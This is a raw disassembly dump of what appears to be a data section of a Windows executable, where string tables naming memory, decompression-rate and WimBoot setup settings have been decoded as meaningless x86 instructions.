  4016ce:	or     al,BYTE PTR [eax]
  4016d0:	sub    eax,0x2d2d2d2d
  4016d5:	sub    eax,0x2d2d2d2d
  4016da:	sub    eax,0xa2d
  4016df:	add    BYTE PTR [esi+0x6c],al
  4016e2:	popa   
  4016e3:	addr16 jae 0x401720
  4016e6:	and    BYTE PTR ds:0xa75,ah
  4016ec:	dec    ebp
  4016ed:	imul   ebp,DWORD PTR [esi+0x50],0x65636f72
  4016f4:	jae    0x401769
  4016f6:	outs   dx,DWORD PTR ds:[esi]
  4016f7:	jb     0x40173c
  4016f9:	outs   dx,DWORD PTR ds:[esi]
  4016fa:	jne    0x40176a
  4016fc:	je     0x401738
  4016fe:	and    BYTE PTR ds:0xa75,ah
  401704:	dec    ebp
  401705:	imul   ebp,DWORD PTR [esi+0x52],0x69534d41
  40170c:	jp     0x401773
  40170e:	dec    ebp
  40170f:	inc    edx
  401710:	cmp    ah,BYTE PTR [eax]
  401712:	and    eax,0xa75
  401717:	add    BYTE PTR [ebp+0x61],cl
  40171a:	js     0x401772
  40171c:	outs   dx,DWORD PTR ds:[esi]
  40171d:	ins    BYTE PTR es:[edi],dx
  40171e:	jne    0x40178d
  401720:	gs push ebx
  401722:	imul   edi,DWORD PTR [edx+0x65],0x2820424d
  401729:	inc    edi
  40172a:	inc    edx
  40172b:	sub    DWORD PTR [edx],edi
  40172d:	and    BYTE PTR ds:0x25282075,ah
  401733:	jne    0x40175e
  401735:	or     al,BYTE PTR [eax]
  401737:	add    BYTE PTR [ebp+0x69],cl
  40173a:	outs   dx,BYTE PTR ds:[esi]
  40173b:	inc    esp
  40173c:	arpl   WORD PTR gs:[edi+0x6d],bp
  401740:	jo     0x4017b4
  401742:	gs jae 0x4017b8
  401745:	imul   ebp,DWORD PTR [edi+0x6e],0x65746152
  40174c:	dec    ebx
  40174d:	inc    edx
  40174e:	jae    0x401770
  401750:	sub    BYTE PTR [ebp+0x42],cl
  401753:	jae    0x40177e
  401755:	cmp    ah,BYTE PTR [eax]
  401757:	and    eax,0x25282075
  40175c:	jne    0x401787
  40175e:	or     al,BYTE PTR [eax]
  401760:	sub    BYTE PTR [ecx+0x66],ch
  401763:	and    BYTE PTR [edx+0x6f],dh
  401766:	je     0x4017c9
  401768:	je     0x4017d3
  40176a:	outs   dx,DWORD PTR ds:[esi]
  40176b:	outs   dx,BYTE PTR ds:[esi]
  40176c:	popa   
  40176d:	ins    BYTE PTR es:[edi],dx
  40176e:	and    BYTE PTR [ecx+ebp*2+0x73],ah
  401772:	imul   ebp,DWORD PTR [ecx],0x20
  401775:	dec    ebp
  401776:	imul   ebp,DWORD PTR [esi+0x44],0x6d6f6365
  40177d:	jo     0x4017f1
  40177f:	gs jae 0x4017f5
  401782:	imul   ebp,DWORD PTR [edi+0x6e],0x65746152
  401789:	dec    ebx
  40178a:	inc    edx
  40178b:	jae    0x4017ad
  40178d:	sub    BYTE PTR [ebp+0x42],cl
  401790:	jae    0x4017bb
  401792:	cmp    ah,BYTE PTR [eax]
  401794:	and    eax,0x25282075
  401799:	jne    0x4017c4
  40179b:	or     al,BYTE PTR [eax]
  40179d:	add    BYTE PTR [eax],al
  40179f:	add    BYTE PTR [ebp+0x69],cl
  4017a2:	outs   dx,BYTE PTR ds:[esi]
  4017a3:	inc    ebx
  4017a4:	push   eax
  4017a5:	push   ebp
  4017a6:	dec    eax
  4017a7:	gs popa 
  4017a9:	fs jb  0x40181b
  4017ac:	outs   dx,DWORD PTR ds:[esi]
  4017ad:	ins    DWORD PTR es:[edi],dx
  4017ae:	and    BYTE PTR [eax],ch
  4017b0:	push   eax
  4017b1:	gs jb  0x401817
  4017b4:	sub    DWORD PTR [edx],edi
  4017b6:	and    BYTE PTR ds:0xa75,ah
  4017bc:	dec    esp
  4017bd:	outs   dx,DWORD PTR ds:[esi]
  4017be:	ja     0x401813
  4017c0:	je     0x401831
  4017c2:	jb     0x401825
  4017c4:	addr16 gs push eax
  4017c7:	push   0x4d656e6f
  4017cc:	inc    edx
  4017cd:	and    BYTE PTR [eax],ch
  4017cf:	inc    edi
  4017d0:	inc    edx
  4017d1:	sub    DWORD PTR [edx],edi
  4017d3:	and    BYTE PTR ds:0x25282075,ah
  4017d9:	jne    0x401804
  4017db:	or     al,BYTE PTR [eax]
  4017dd:	add    BYTE PTR [eax],al
  4017df:	add    BYTE PTR [edx],cl
  4017e1:	add    BYTE PTR [eax],al
  4017e3:	add    BYTE PTR [ebp+0x0],cl
  4017e6:	popa   
  4017e7:	add    BYTE PTR [eax+0x0],bh
  4017ea:	inc    esp
  4017eb:	add    BYTE PTR [ebp+0x0],ah
  4017ee:	arpl   WORD PTR [eax],ax
  4017f0:	outs   dx,DWORD PTR ds:[esi]
  4017f1:	add    BYTE PTR [ebp+0x0],ch
  4017f4:	jo     0x4017f6
  4017f6:	jb     0x4017f8
  4017f8:	add    BYTE PTR gs:[ebx+0x0],dh
  4017fc:	jae    0x4017fe
  4017fe:	imul   eax,DWORD PTR [eax],0x6e006f
  401804:	push   edx
  401805:	add    BYTE PTR [ecx+0x0],ah
  401808:	je     0x40180a
  40180a:	add    BYTE PTR gs:[ebx+0x0],cl
  40180e:	inc    edx
  40180f:	add    BYTE PTR [ebx+0x0],dh
  401812:	add    BYTE PTR [eax],al
  401814:	add    BYTE PTR [eax],al
  401816:	add    BYTE PTR [eax],al
  401818:	dec    ebp
  401819:	add    BYTE PTR [ecx+0x0],ch
  40181c:	outs   dx,BYTE PTR ds:[esi]
  40181d:	add    BYTE PTR [eax+eax*1+0x65],al
  401821:	add    BYTE PTR [ebx+0x0],ah
  401824:	outs   dx,DWORD PTR ds:[esi]
  401825:	add    BYTE PTR [ebp+0x0],ch
  401828:	jo     0x40182a
  40182a:	jb     0x40182c
  40182c:	add    BYTE PTR gs:[ebx+0x0],dh
  401830:	jae    0x401832
  401832:	imul   eax,DWORD PTR [eax],0x6e006f
  401838:	push   edx
  401839:	add    BYTE PTR [ecx+0x0],ah
  40183c:	je     0x40183e
  40183e:	add    BYTE PTR gs:[eax+0x0],cl
  401842:	add    BYTE PTR gs:[ecx+0x0],ah
  401846:	add    BYTE PTR fs:[edx+0x0],dh
  40184a:	outs   dx,DWORD PTR ds:[esi]
  40184b:	add    BYTE PTR [edi+0x0],ch
  40184e:	ins    DWORD PTR es:[edi],dx
  40184f:	add    BYTE PTR [ebx+0x0],cl
  401852:	inc    edx
  401853:	add    BYTE PTR [ebx+0x0],dh
  401856:	add    BYTE PTR [eax],al
  401858:	dec    ebp
  401859:	add    BYTE PTR [ecx+0x0],ah
  40185c:	js     0x40185e
  40185e:	inc    esp
  40185f:	add    BYTE PTR [ebp+0x0],ah
  401862:	arpl   WORD PTR [eax],ax
  401864:	outs   dx,DWORD PTR ds:[esi]
  401865:	add    BYTE PTR [ebp+0x0],ch
  401868:	jo     0x40186a
  40186a:	jb     0x40186c
  40186c:	add    BYTE PTR gs:[ebx+0x0],dh
  401870:	jae    0x401872
  401872:	imul   eax,DWORD PTR [eax],0x6e006f
  401878:	push   edx
  401879:	add    BYTE PTR [ecx+0x0],ah
  40187c:	je     0x40187e
  40187e:	add    BYTE PTR gs:[eax+0x0],cl
  401882:	add    BYTE PTR gs:[ecx+0x0],ah
  401886:	add    BYTE PTR fs:[edx+0x0],dh
  40188a:	outs   dx,DWORD PTR ds:[esi]
  40188b:	add    BYTE PTR [edi+0x0],ch
  40188e:	ins    DWORD PTR es:[edi],dx
  40188f:	add    BYTE PTR [ebx+0x0],cl
  401892:	inc    edx
  401893:	add    BYTE PTR [ebx+0x0],dh
  401896:	add    BYTE PTR [eax],al
  401898:	dec    esp
  401899:	add    BYTE PTR [eax+0x0],dl
  40189c:	data16 add BYTE PTR [edi+0x0],ch
  4018a0:	jb     0x4018a2
  4018a2:	inc    ecx
  4018a3:	add    BYTE PTR [esi+0x0],ch
  4018a6:	popa   
  4018a7:	add    BYTE PTR [eax+eax*1+0x79],ch
  4018ab:	add    BYTE PTR [ebx+0x0],dh
  4018ae:	imul   eax,DWORD PTR [eax],0x73
  4018b4:	jo     0x4018b6
  4018b6:	outs   dx,DWORD PTR ds:[esi]
  4018b7:	add    BYTE PTR [edi+0x0],dh
  4018ba:	jb     0x4018bc
  4018bc:	jo     0x4018be
  4018be:	jb     0x4018c0
  4018c0:	outs   dx,DWORD PTR ds:[esi]
  4018c1:	add    BYTE PTR [esi+0x0],ah
  4018c4:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  4018c9:	add    BYTE PTR [eax+eax*1+0x0],ch
  4018cd:	add    BYTE PTR [eax],al
  4018cf:	add    BYTE PTR [eax+0x6f],dl
  4018d2:	ja     0x401939
  4018d4:	jb     0x40191d
  4018d6:	gs je  0x40191a
  4018d9:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  4018dd:	gs push ebx
  4018df:	arpl   WORD PTR [eax+0x65],bp
  4018e2:	ins    DWORD PTR es:[edi],dx
  4018e3:	add    BYTE PTR gs:[eax],al
  4018e6:	add    BYTE PTR [eax],al
  4018e8:	push   eax
  4018e9:	outs   dx,DWORD PTR ds:[esi]
  4018ea:	ja     0x401951
  4018ec:	jb     0x401941
  4018ee:	gs je  0x401932
  4018f1:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  4018f5:	gs push ebx
  4018f7:	arpl   WORD PTR [eax+0x65],bp
  4018fa:	ins    DWORD PTR es:[edi],dx
  4018fb:	add    BYTE PTR gs:[eax],al
  4018fe:	add    BYTE PTR [eax],al
  401900:	inc    esi
  401901:	add    BYTE PTR [ecx+0x0],ah
  401904:	imul   eax,DWORD PTR [eax],0x65006c
  40190a:	add    BYTE PTR fs:[eax+0x0],dl
  40190e:	outs   dx,DWORD PTR ds:[esi]
  40190f:	add    BYTE PTR [edi+0x0],dh
  401912:	add    BYTE PTR gs:[edx+0x0],dh
  401916:	push   ebx
  401917:	add    BYTE PTR [ebp+0x0],ah
  40191a:	je     0x40191c
  40191c:	inc    ecx
  40191d:	add    BYTE PTR [ebx+0x0],ah
  401920:	je     0x401922
  401922:	imul   eax,DWORD PTR [eax],0x650076
  401928:	push   ebx
  401929:	add    BYTE PTR [ebx+0x0],ah
  40192c:	push   0x6d006500
  401931:	add    BYTE PTR [ebp+0x0],ah
  401934:	add    BYTE PTR [eax],al
  401936:	add    BYTE PTR [eax],al
  401938:	inc    esi
  401939:	add    BYTE PTR [ecx+0x0],ah
  40193c:	imul   eax,DWORD PTR [eax],0x65006c
  401942:	add    BYTE PTR fs:[eax+0x0],dl
  401946:	outs   dx,DWORD PTR ds:[esi]
  401947:	add    BYTE PTR [edi+0x0],dh
  40194a:	add    BYTE PTR gs:[edx+0x0],dh
  40194e:	inc    edi
  40194f:	add    BYTE PTR [ebp+0x0],ah
  401952:	je     0x401954
  401954:	inc    ecx
  401955:	add    BYTE PTR [ebx+0x0],ah
  401958:	je     0x40195a
  40195a:	imul   eax,DWORD PTR [eax],0x650076
  401960:	push   ebx
  401961:	add    BYTE PTR [ebx+0x0],ah
  401964:	push   0x6d006500
  401969:	add    BYTE PTR [ebp+0x0],ah
  40196c:	add    BYTE PTR [eax],al
  40196e:	add    BYTE PTR [eax],al
  401970:	inc    esi
  401971:	add    BYTE PTR [ecx+0x0],ah
  401974:	imul   eax,DWORD PTR [eax],0x65006c
  40197a:	add    BYTE PTR fs:[eax+eax*1+0x6f],cl
  40197f:	add    BYTE PTR [ecx+0x0],ah
  401982:	add    BYTE PTR fs:[eax+0x0],dl
  401986:	outs   dx,DWORD PTR ds:[esi]
  401987:	add    BYTE PTR [edi+0x0],dh
  40198a:	jb     0x40198c
  40198c:	push   eax
  40198d:	add    BYTE PTR [edx+0x0],dh
  401990:	outs   dx,DWORD PTR ds:[esi]
  401991:	add    BYTE PTR [esi+0x0],ah
  401994:	add    BYTE PTR [eax],al
  401996:	add    BYTE PTR [eax],al
  401998:	inc    esi
  401999:	add    BYTE PTR [ecx+0x0],ah
  40199c:	imul   eax,DWORD PTR [eax],0x65006c
  4019a2:	add    BYTE PTR fs:[eax+eax*1+0x65],al
  4019a7:	add    BYTE PTR [ebx+0x0],al
  4019aa:	outs   dx,DWORD PTR ds:[esi]
  4019ab:	add    BYTE PTR [ebp+0x0],ch
  4019ae:	jo     0x4019b0
  4019b0:	jb     0x4019b2
  4019b2:	add    BYTE PTR gs:[ebx+0x0],dh
  4019b6:	jae    0x4019b8
  4019b8:	imul   eax,DWORD PTR [eax],0x6e006f
  4019be:	push   edx
  4019bf:	add    BYTE PTR [ecx+0x0],ah
  4019c2:	je     0x4019c4
  4019c4:	add    BYTE PTR gs:[ebx+0x0],al
  4019c8:	push   0x63006500
  4019cd:	add    BYTE PTR [ebx+0x0],ch
  4019d0:	add    BYTE PTR [eax],al
  4019d2:	add    BYTE PTR [eax],al
  4019d4:	inc    edx
  4019d5:	add    BYTE PTR [ecx+0x0],ah
  4019d8:	jae    0x4019da
  4019da:	add    BYTE PTR gs:[ebx+0x0],al
  4019de:	push   eax
  4019df:	add    BYTE PTR [ebp+0x0],dl
  4019e2:	dec    eax
  4019e3:	add    BYTE PTR [ebp+0x0],ah
  4019e6:	popa   
  4019e7:	add    BYTE PTR [eax+eax*1+0x72],ah
  4019eb:	add    BYTE PTR [edi+0x0],ch
  4019ee:	outs   dx,DWORD PTR ds:[esi]
  4019ef:	add    BYTE PTR [ebp+0x0],ch
  4019f2:	push   eax
  4019f3:	add    BYTE PTR [ebp+0x0],ah
  4019f6:	jb     0x4019f8
  4019f8:	arpl   WORD PTR [eax],ax
  4019fa:	add    BYTE PTR [eax],al
  4019fc:	inc    esp
  4019fd:	add    BYTE PTR [ebp+0x0],ah
  401a00:	arpl   WORD PTR [eax],ax
  401a02:	outs   dx,DWORD PTR ds:[esi]
  401a03:	add    BYTE PTR [ebp+0x0],ch
  401a06:	jo     0x401a08
  401a08:	jb     0x401a0a
  401a0a:	add    BYTE PTR gs:[ebx+0x0],dh
  401a0e:	jae    0x401a10
  401a10:	imul   eax,DWORD PTR [eax],0x6e006f
  401a16:	push   edx
  401a17:	add    BYTE PTR [ecx+0x0],ah
  401a1a:	je     0x401a1c
  401a1c:	add    BYTE PTR gs:[ebx+0x0],cl
  401a20:	inc    edx
  401a21:	add    BYTE PTR [ebx+0x0],dh
  401a24:	add    BYTE PTR [eax],al
  401a26:	add    BYTE PTR [eax],al
  401a28:	inc    esi
  401a29:	add    BYTE PTR [ecx+0x0],ah
  401a2c:	imul   eax,DWORD PTR [eax],0x65006c
  401a32:	add    BYTE PTR fs:[ebx+0x0],al
  401a36:	push   eax
  401a37:	add    BYTE PTR [ebp+0x0],dl
  401a3a:	dec    eax
  401a3b:	add    BYTE PTR [ebp+0x0],ah
  401a3e:	popa   
  401a3f:	add    BYTE PTR [eax+eax*1+0x72],ah
  401a43:	add    BYTE PTR [edi+0x0],ch
  401a46:	outs   dx,DWORD PTR ds:[esi]
  401a47:	add    BYTE PTR [ebp+0x0],ch
  401a4a:	inc    ebx
  401a4b:	add    BYTE PTR [eax+0x0],ch
  401a4e:	add    BYTE PTR gs:[ebx+0x0],ah
  401a52:	imul   eax,DWORD PTR [eax],0x0
  401a55:	add    BYTE PTR [eax],al
  401a57:	add    BYTE PTR [ebx+0x0],al
  401a5a:	push   eax
  401a5b:	add    BYTE PTR [ebp+0x0],dl
  401a5e:	dec    eax
  401a5f:	add    BYTE PTR [ebp+0x0],ah
  401a62:	popa   
  401a63:	add    BYTE PTR [eax+eax*1+0x72],ah
  401a67:	add    BYTE PTR [edi+0x0],ch
  401a6a:	outs   dx,DWORD PTR ds:[esi]
  401a6b:	add    BYTE PTR [ebp+0x0],ch
  401a6e:	push   eax
  401a6f:	add    BYTE PTR [ebp+0x0],ah
  401a72:	jb     0x401a74
  401a74:	arpl   WORD PTR [eax],ax
  401a76:	add    BYTE PTR [eax],al
  401a78:	push   eax
  401a79:	add    BYTE PTR [edx+0x0],dh
  401a7c:	outs   dx,DWORD PTR ds:[esi]
  401a7d:	add    BYTE PTR [ebx+0x0],ah
  401a80:	add    BYTE PTR gs:[ebx+0x0],dh
  401a84:	jae    0x401a86
  401a86:	outs   dx,DWORD PTR ds:[esi]
  401a87:	add    BYTE PTR [edx+0x0],dh
  401a8a:	inc    ebx
  401a8b:	add    BYTE PTR [edi+0x0],ch
  401a8e:	jne    0x401a90
  401a90:	outs   dx,BYTE PTR ds:[esi]
  401a91:	add    BYTE PTR [eax+eax*1+0x0],dh
  401a95:	add    BYTE PTR [eax],al
  401a97:	add    BYTE PTR [esi+0x0],al
  401a9a:	popa   
  401a9b:	add    BYTE PTR [ecx+0x0],ch
  401a9e:	ins    BYTE PTR es:[edi],dx
  401a9f:	add    BYTE PTR [ebp+0x0],ah
  401aa2:	add    BYTE PTR fs:[eax+eax*1+0x50],cl
  401aa7:	add    BYTE PTR [ebx+0x0],al
  401aaa:	outs   dx,DWORD PTR ds:[esi]
  401aab:	add    BYTE PTR [ebp+0x0],dh
  401aae:	outs   dx,BYTE PTR ds:[esi]
  401aaf:	add    BYTE PTR [eax+eax*1+0x43],dh
  401ab3:	add    BYTE PTR [eax+0x0],ch
  401ab6:	add    BYTE PTR gs:[ebx+0x0],ah
  401aba:	imul   eax,DWORD PTR [eax],0x0
  401abd:	add    BYTE PTR [eax],al
  401abf:	add    BYTE PTR [esi+0x0],cl
  401ac2:	outs   dx,DWORD PTR ds:[esi]
  401ac3:	add    BYTE PTR [ebx+0x0],dl
  401ac6:	add    BYTE PTR gs:[ebp+0x0],ah
  401aca:	imul   eax,DWORD PTR [eax],0x4c
  401acd:	add    BYTE PTR [ecx+0x0],ah
  401ad0:	je     0x401ad2
  401ad2:	add    BYTE PTR gs:[esi+0x0],ch
  401ad6:	arpl   WORD PTR [eax],ax
  401ad8:	jns    0x401ada
  401ada:	add    BYTE PTR [eax],al
  401adc:	inc    esi
  401add:	add    BYTE PTR [ecx+0x0],ah
  401ae0:	imul   eax,DWORD PTR [eax],0x65006c
  401ae6:	add    BYTE PTR fs:[ebx+0x0],dl
  401aea:	add    BYTE PTR gs:[ebp+0x0],ah
  401aee:	imul   eax,DWORD PTR [eax],0x4c
  401af1:	add    BYTE PTR [ecx+0x0],ah
  401af4:	je     0x401af6
  401af6:	add    BYTE PTR gs:[esi+0x0],ch
  401afa:	arpl   WORD PTR [eax],ax
  401afc:	jns    0x401afe
  401afe:	inc    ebx
  401aff:	add    BYTE PTR [eax+0x0],ch
  401b02:	add    BYTE PTR gs:[ebx+0x0],ah
  401b06:	imul   eax,DWORD PTR [eax],0x0
  401b09:	add    BYTE PTR [eax],al
  401b0b:	add    BYTE PTR [esi+0x0],dl
  401b0e:	outs   dx,DWORD PTR ds:[esi]
  401b0f:	add    BYTE PTR [eax+eax*1+0x75],ch
  401b13:	add    BYTE PTR [ebp+0x0],ch
  401b16:	add    BYTE PTR gs:[ebx+0x0],dl
  401b1a:	imul   eax,DWORD PTR [eax],0x65007a
  401b20:	dec    ebp
  401b21:	add    BYTE PTR [edx+0x0],al
  401b24:	add    BYTE PTR [eax],al
  401b26:	add    BYTE PTR [eax],al
  401b28:	inc    esi
  401b29:	add    BYTE PTR [ecx+0x0],ah
  401b2c:	imul   eax,DWORD PTR [eax],0x65006c
  401b32:	add    BYTE PTR fs:[esi+0x0],dl
  401b36:	outs   dx,DWORD PTR ds:[esi]
  401b37:	add    BYTE PTR [eax+eax*1+0x75],ch
  401b3b:	add    BYTE PTR [ebp+0x0],ch
  401b3e:	add    BYTE PTR gs:[ebx+0x0],dl
  401b42:	imul   eax,DWORD PTR [eax],0x65007a
  401b48:	inc    ebx
  401b49:	add    BYTE PTR [eax+0x0],ch
  401b4c:	add    BYTE PTR gs:[ebx+0x0],ah
  401b50:	imul   eax,DWORD PTR [eax],0x0
  401b53:	add    BYTE PTR [eax+eax*1+0x6f],cl
  401b57:	add    BYTE PTR [edi+0x0],dh
  401b5a:	dec    ebp
  401b5b:	add    BYTE PTR [ebp+0x0],ah
  401b5e:	ins    DWORD PTR es:[edi],dx
  401b5f:	add    BYTE PTR [eax+0x0],dl
  401b62:	push   0x6e006f00
  401b67:	add    BYTE PTR [ebp+0x0],ah
  401b6a:	dec    ebp
  401b6b:	add    BYTE PTR [ecx+0x0],ch
  401b6e:	outs   dx,BYTE PTR ds:[esi]
  401b6f:	add    BYTE PTR [edx+0x0],dl
  401b72:	inc    ecx
  401b73:	add    BYTE PTR [ebp+0x0],cl
  401b76:	push   ebx
  401b77:	add    BYTE PTR [ecx+0x0],ch
  401b7a:	jp     0x401b7c
  401b7c:	add    BYTE PTR gs:[ebp+0x0],cl
  401b80:	inc    edx
  401b81:	add    BYTE PTR [eax],al
  401b83:	add    BYTE PTR [edx+0x0],dl
  401b86:	inc    ecx
  401b87:	add    BYTE PTR [ebp+0x0],cl
  401b8a:	push   ebx
  401b8b:	add    BYTE PTR [ecx+0x0],ch
  401b8e:	jp     0x401b90
  401b90:	add    BYTE PTR gs:[ebp+0x0],cl
  401b94:	inc    edx
  401b95:	add    BYTE PTR [eax],al
  401b97:	add    BYTE PTR [esi+0x0],al
  401b9a:	popa   
  401b9b:	add    BYTE PTR [ecx+0x0],ch
  401b9e:	ins    BYTE PTR es:[edi],dx
  401b9f:	add    BYTE PTR [ebp+0x0],ah
  401ba2:	add    BYTE PTR fs:[edx+0x0],dl
  401ba6:	inc    ecx
  401ba7:	add    BYTE PTR [ebp+0x0],cl
  401baa:	push   ebx
  401bab:	add    BYTE PTR [ecx+0x0],ch
  401bae:	jp     0x401bb0
  401bb0:	add    BYTE PTR gs:[ebx+0x0],al
  401bb4:	push   0x63006500
  401bb9:	add    BYTE PTR [ebx+0x0],ch
  401bbc:	add    BYTE PTR [eax],al
  401bbe:	add    BYTE PTR [eax],al
  401bc0:	dec    eax
  401bc1:	add    BYTE PTR [ecx+0x0],ah
  401bc4:	jae    0x401bc6
  401bc6:	push   ebx
  401bc7:	add    BYTE PTR [ebp+0x0],ah
  401bca:	add    BYTE PTR gs:[ebx+0x0],ch
  401bce:	dec    ebp
  401bcf:	add    BYTE PTR [ecx+0x0],ch
  401bd2:	outs   dx,BYTE PTR ds:[esi]
  401bd3:	add    BYTE PTR [eax+eax*1+0x65],al
  401bd7:	add    BYTE PTR [ebx+0x0],al
  401bda:	outs   dx,DWORD PTR ds:[esi]
  401bdb:	add    BYTE PTR [ebp+0x0],ch
  401bde:	jo     0x401be0
  401be0:	jb     0x401be2
  401be2:	add    BYTE PTR gs:[ebx+0x0],dh
  401be6:	jae    0x401be8
  401be8:	imul   eax,DWORD PTR [eax],0x6e006f
  401bee:	push   edx
  401bef:	add    BYTE PTR [ecx+0x0],ah
  401bf2:	je     0x401bf4
  401bf4:	add    BYTE PTR gs:[ebx+0x0],cl
  401bf8:	inc    edx
  401bf9:	add    BYTE PTR [ebx+0x0],dh
  401bfc:	add    BYTE PTR [eax],al
  401bfe:	add    BYTE PTR [eax],al
  401c00:	push   ebp
  401c01:	add    BYTE PTR [edx],bh
  401c03:	add    BYTE PTR [eax+eax*1+0x0],bl
  401c07:	add    BYTE PTR [ebp+0x0],al
  401c0a:	data16 add BYTE PTR [esi+0x0],ah
  401c0e:	add    BYTE PTR gs:[ebx+0x0],ah
  401c12:	je     0x401c14
  401c14:	imul   eax,DWORD PTR [eax],0x650076
  401c1a:	inc    esi
  401c1b:	add    BYTE PTR [eax+eax*1+0x61],ch
  401c1f:	add    BYTE PTR [edi+0x0],ah
  401c22:	jae    0x401c24
  401c24:	add    BYTE PTR [eax],al
  401c26:	add    BYTE PTR [eax],al
  401c28:	inc    ebp
  401c29:	add    BYTE PTR [esi+0x0],dh
  401c2c:	popa   
  401c2d:	add    BYTE PTR [eax+eax*1+0x46],ch
  401c31:	add    BYTE PTR [eax+eax*1+0x61],ch
  401c35:	add    BYTE PTR [edi+0x0],ah
  401c38:	jae    0x401c3a
  401c3a:	add    BYTE PTR [eax],al
  401c3c:	push   ebx
  401c3d:	add    BYTE PTR [ecx+0x0],bh
  401c40:	jae    0x401c42
  401c42:	je     0x401c44
  401c44:	add    BYTE PTR gs:[ebp+0x0],ch
  401c48:	push   eax
  401c49:	add    BYTE PTR [edi+0x0],ch
  401c4c:	ins    BYTE PTR es:[edi],dx
  401c4d:	add    BYTE PTR [ecx+0x0],ch
  401c50:	arpl   WORD PTR [eax],ax
  401c52:	jns    0x401c54
  401c54:	add    BYTE PTR [eax],al
  401c56:	add    BYTE PTR [eax],al
  401c58:	inc    esi
  401c59:	add    BYTE PTR [edi+0x0],ch
  401c5c:	jb     0x401c5e
  401c5e:	arpl   WORD PTR [eax],ax
  401c60:	add    BYTE PTR gs:[ebx+0x0],al
  401c64:	outs   dx,DWORD PTR ds:[esi]
  401c65:	add    BYTE PTR [ebp+0x0],ch
  401c68:	jo     0x401c6a
  401c6a:	jb     0x401c6c
  401c6c:	add    BYTE PTR gs:[ebx+0x0],dh
  401c70:	jae    0x401c72
  401c72:	imul   eax,DWORD PTR [eax],0x6e006f
  401c78:	add    BYTE PTR [eax],al
  401c7a:	add    BYTE PTR [eax],al
  401c7c:	push   ebx
  401c7d:	add    BYTE PTR [ecx+0x0],bl
  401c80:	push   ebx
  401c81:	add    BYTE PTR [eax+eax*1+0x45],dl
  401c85:	add    BYTE PTR [ebp+0x0],cl
  401c88:	pop    esp
  401c89:	add    BYTE PTR [ebx+0x0],dl
  401c8c:	add    BYTE PTR gs:[eax+eax*1+0x75],dh
  401c91:	add    BYTE PTR [eax+0x0],dh
  401c94:	add    BYTE PTR [eax],al
  401c96:	add    BYTE PTR [eax],al
  401c98:	push   edi
  401c99:	add    BYTE PTR [ecx+0x0],ch
  401c9c:	ins    DWORD PTR es:[edi],dx
  401c9d:	add    BYTE PTR [edx+0x0],al
  401ca0:	outs   dx,DWORD PTR ds:[esi]
  401ca1:	add    BYTE PTR [edi+0x0],ch
  401ca4:	je     0x401ca6
  401ca6:	add    BYTE PTR [eax],al
  401ca8:	fidivr DWORD PTR [edi+0x5e]
  401cab:	mov    WORD PTR [edi-0x65b56918],?
  401cb1:	test   DWORD PTR [esi+0x638c3ae2],esp
  401cb7:	pop    esp
	...
  401cc4:	xor    bh,BYTE PTR [ebx]
  401cc6:	lahf   
  401cc7:	push   ebp
  401cc8:	add    BYTE PTR [eax],al
  401cca:	add    BYTE PTR [eax],al
  401ccc:	add    al,BYTE PTR [eax]
  401cce:	add    BYTE PTR [eax],al
  401cd0:	and    al,0x0
  401cd2:	add    BYTE PTR [eax],al
  401cd4:	test   BYTE PTR ds:0x11840000,bl
  401cda:	add    BYTE PTR [eax],al
  401cdc:	add    BYTE PTR [eax],al
  401cde:	add    BYTE PTR [eax],al
  401ce0:	xor    bh,BYTE PTR [ebx]
  401ce2:	lahf   
  401ce3:	push   ebp
  401ce4:	add    BYTE PTR [eax],al
  401ce6:	add    BYTE PTR [eax],al
  401ce8:	or     eax,0xc8000000
  401ced:	add    DWORD PTR [eax],eax
  401cef:	add    BYTE PTR [ebp+ebx*1+0x11bc0000],bh
	...
  401d16:	add    BYTE PTR [eax],al
  401d18:	push   0x0
	...
  401d51:	add    BYTE PTR [eax],al
  401d53:	add    BYTE PTR [eax],cl
  401d55:	add    BYTE PTR [eax+0x0],0x80
  401d59:	sbb    eax,0x10040
  401d5e:	add    BYTE PTR [eax],al
  401d60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d61:	rol    DWORD PTR [eax+0x0],0x0
  401d65:	add    BYTE PTR [eax],al
  401d67:	add    BYTE PTR [eax+edx*1],bl
  401d6a:	inc    eax
  401d6b:	add    BYTE PTR [edx],bl
  401d6d:	add    BYTE PTR [eax],al
  401d6f:	add    BYTE PTR [eax],al
  401d71:	xor    eax,0x0
	...
  401d7e:	add    BYTE PTR [eax],al
  401d80:	loopne 0x401df6
  401d82:	add    BYTE PTR [eax],al
  401d84:	push   edx
  401d85:	push   ebx
  401d86:	inc    esp
  401d87:	push   ebx
  401d88:	out    0xcf,al
  401d8a:	push   edi
  401d8b:	add    BYTE PTR [ebp-0x79bcad34],al
  401d91:	aas    
  401d92:	ss loop 0x401d30
  401d95:	int3   
  401d96:	adc    ebp,esp
  401d98:	add    DWORD PTR [eax],eax
  401d9a:	add    BYTE PTR [eax],al
  401d9c:	arpl   WORD PTR [edi+0x6d],bp
  401d9f:	jo     0x401e02
  401da1:	arpl   WORD PTR [esi+ebp*1+0x70],si
  401da5:	bound  eax,QWORD PTR fs:[eax]
	...
  401dbc:	inc    edi
  401dbd:	inc    ebx
  401dbe:	push   esp
  401dbf:	dec    esp
  401dc0:	add    BYTE PTR [eax],dl
  401dc2:	add    BYTE PTR [eax],al
  401dc4:	add    al,0x0
  401dc6:	add    BYTE PTR [eax],al
  401dc8:	cs inc ebx
  401dca:	push   edx
  401dcb:	push   esp
  401dcc:	and    al,0x58
  401dce:	inc    ebx
  401dcf:	inc    ecx
  401dd0:	add    BYTE PTR [eax],al
  401dd2:	add    BYTE PTR [eax],al
  401dd4:	add    al,0x10
  401dd6:	add    BYTE PTR [eax],al
  401dd8:	add    al,0x0
  401dda:	add    BYTE PTR [eax],al
  401ddc:	cs inc ebx
  401dde:	push   edx
  401ddf:	push   esp
  401de0:	and    al,0x58
  401de2:	inc    ebx
  401de3:	inc    ecx
  401de4:	inc    ecx
  401de5:	add    BYTE PTR [eax],al
  401de7:	add    BYTE PTR [eax],cl
  401de9:	adc    BYTE PTR [eax],al
  401deb:	add    BYTE PTR [eax+eax*1],al
  401dee:	add    BYTE PTR [eax],al
  401df0:	cs inc ebx
  401df2:	push   edx
  401df3:	push   esp
  401df4:	and    al,0x58
  401df6:	inc    ebx
  401df7:	pop    edx
  401df8:	add    BYTE PTR [eax],al
  401dfa:	add    BYTE PTR [eax],al
